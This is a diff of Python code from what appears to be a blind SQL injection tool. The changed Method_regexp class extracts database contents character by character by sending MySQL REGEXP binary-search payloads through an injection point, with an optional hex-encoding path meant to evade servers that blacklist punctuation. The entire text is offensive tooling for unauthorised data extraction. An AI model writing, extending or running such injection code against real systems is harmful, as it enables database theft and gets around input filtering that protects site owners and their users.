@@ -412,24 +412,17 @@ class Method_bitwise(Method_Blind):
           requester = self.make_requester()
           continue
 
-class Method_binary(Method_Blind):
-  '''Binary Search'''
-  pass
-
-def quote_mysql(s):
-  s = s.replace("'", "''")
-  return s
-
-def quote_prefix(s):
-  return s.replace('.', r'\\.').replace('*', r'\\*').replace('+', r'\\+').replace('?', r'\\?').replace('$', r'\\$')
-
 class Method_regexp(Method_bitwise):
+  '''MySQL REGEXP'''
 
   def get_row(self, query, row_pos=0):
+
     result = ''
 
     while True:
-      s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._%@!\'"#$&*+?,/:;<=>`~\x1f' # removed: ][\^|-{}()
+      # remove special chars like \ or ^ if getting unexpected results
+      s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ._%@!^\'"#$&*+?,/:;\\<=>`~|(){}[]-\xff'
+
       prev_state = 0
 
       while len(s) > 1:
@@ -438,7 +431,12 @@ class Method_regexp(Method_bitwise):
         right = s[len(s) / 2:]
 
         regexp = '^%s[%s]' % ('.' * len(result), left)
-        regexp = quote_mysql(regexp)
+
+        if False: # hex-encode if server blacklists punctuation
+          regexp = '^%s[%s]' % ('.' * len(result), left.replace('\\', '\\\\'))
+          regexp = '0x' + regexp.encode('hex')
+        else:
+          regexp = "'^%s[%s]'" % ('.' * len(result), left.replace("'", "''").replace('\\', '\\\\\\\\'))
 
         payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
 
@@ -461,7 +459,7 @@ class Method_regexp(Method_bitwise):
       char = s[0]
       logger.debug('char: %d (%r)' % (ord(char), char))
 
-      if char == '\x1f':
+      if char == '\xff':
         break
 
       sys.stdout.write('%s' % char)
